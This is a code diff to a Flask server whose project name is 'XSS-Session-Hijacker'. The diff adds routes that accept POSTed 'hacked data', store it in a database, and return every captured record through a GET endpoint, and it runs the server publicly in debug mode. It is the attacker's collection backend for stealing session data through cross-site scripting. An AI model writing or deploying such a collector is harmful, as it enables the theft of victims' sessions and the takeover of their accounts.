@@ -19,7 +19,7 @@ def configure_app():
     db.create_all()
 
 
-@app.route('/')
+@app.route('/api')
 def home():
     return jsonify({
         'project': 'XSS-Session-Hijacker',
@@ -29,8 +29,8 @@ def home():
     })
 
 
-@app.route('/hacked', methods=['POST'])
-def get_hacked_data():
+@app.route('/api/hacked', methods=['POST'])
+def store_hacked_data():
     res = {'message': 'json data needed'}
     res_code = 400
 
@@ -50,3 +50,17 @@ def get_hacked_data():
             res = {'message': 'success'}
             res_code = 200
     return jsonify(res), res_code
+
+@app.route('/api/get_hacked_data', methods=['GET'])
+def send_hacked_data():
+    data_list = HackedData.query.all()
+
+    hacked_data_list = list()
+    for hacked_data in data_list:
+        hacked_data_list.append(hacked_data.jsonify())
+    return jsonify(hacked_data_list),200
+
+
+if __name__ == '__main__':
+    # run in debug mode
+    app.run('0.0.0.0', 5000, True)
